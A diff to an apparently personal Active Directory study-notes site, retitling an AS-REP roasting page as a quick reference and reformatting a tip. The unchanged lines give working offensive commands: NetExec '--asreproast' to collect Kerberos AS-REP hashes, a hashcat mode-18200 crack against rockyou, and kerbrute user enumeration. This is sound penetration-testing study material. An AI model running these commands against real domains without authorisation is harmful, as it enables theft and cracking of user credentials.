@@ -1,6 +1,11 @@
 ---
-title: "AS-REP Roasting"
+title: "AS-REP Roasting Quick Reference"
+description: "Organized Active Directory study notes and reference."
 ---
+
+{/* Generated from Active Directory/Reference/AS-REP Roasting Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 Accounts with **"Do not require Kerberos pre-authentication"** set will return an AS-REP encrypted with the user's password hash — no creds needed to request it.
 
@@ -15,6 +20,5 @@ nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
 hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
-<Tip>
-Combine with username enumeration (`kerbrute userenum`) to build the userlist for the no-creds path.
-</Tip>
+
+> Combine with username enumeration (`kerbrute userenum`) to build the userlist for the no-creds path.
